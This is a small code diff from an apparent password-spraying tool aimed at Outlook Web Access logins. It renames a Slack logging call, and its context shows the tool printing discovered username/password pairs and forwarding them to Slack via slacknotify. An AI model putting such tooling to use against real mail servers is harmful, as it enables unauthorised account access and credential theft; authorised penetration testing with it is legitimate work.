@@ -52,12 +52,12 @@ def owa_authenticate(url, username, password, useragent, pluginargs):
         elif resp.status_code == 500:
             data_response['output'] = utils.prYellow(f"[*] WARNING: Found credentials, but server returned 500: {username}:{password}")
             data_response['success'] = False
-            utils.slackupdate("Potential Credentials") 
+            utils.slacklog("Potential Credentials") 
             utils.slacknotify(username, password)
         elif resp.status_code == 504:
             data_response['output'] = utils.prYellow(f"[*] Potential Credentials, but server returned 504: {username}:{password}")
             data_response['success'] = False 
-            utils.slackupdate("Potential Credentials")
+            utils.slacklog("Potential Credentials")
             utils.slacknotify(username, password)
         else:
             data_response['output'] = utils.prRed(f"[-] Authentication failed: {username}:{password} (Invalid credentials)")
